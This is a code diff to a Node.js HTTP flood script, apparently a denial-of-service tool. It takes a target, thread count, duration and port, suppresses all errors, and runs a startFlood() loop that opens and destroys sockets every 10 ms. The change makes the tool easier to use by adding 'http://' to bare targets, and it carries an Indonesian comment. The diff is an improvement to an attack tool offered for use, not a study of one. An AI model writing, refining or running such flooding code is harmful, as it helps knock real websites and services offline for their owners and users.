@@ -9,18 +9,24 @@ if (process.argv.length <= 4) {
     process.exit(-1);
 }
 
-const target = process.argv[2];
-const parsed = url.parse(target);
-const host = parsed.hostname || parsed.host;
+let target = process.argv[2];
 const threads = parseInt(process.argv[3], 10);
 const time = parseInt(process.argv[4], 10);
 const port = parseInt(process.argv[5], 10) || 80;
 
+// Tambahkan http:// jika user tidak menyertakan skema
+if (!/^https?:\/\//i.test(target)) {
+    target = 'http://' + target;
+}
+
+const parsed = url.parse(target);
+const host = parsed.hostname || parsed.host;
+
 require('events').EventEmitter.defaultMaxListeners = 0;
 process.setMaxListeners(0);
 
-process.on('uncaughtException', function (e) { });
-process.on('unhandledRejection', function (e) { });
+process.on('uncaughtException', function () { });
+process.on('unhandledRejection', function () { });
 
 let userAgents = [];
 
@@ -72,6 +78,6 @@ function startFlood() {
             s.destroy();
         });
     }, 10);
-    
+
     setTimeout(() => clearInterval(int), time * 1000);
 }
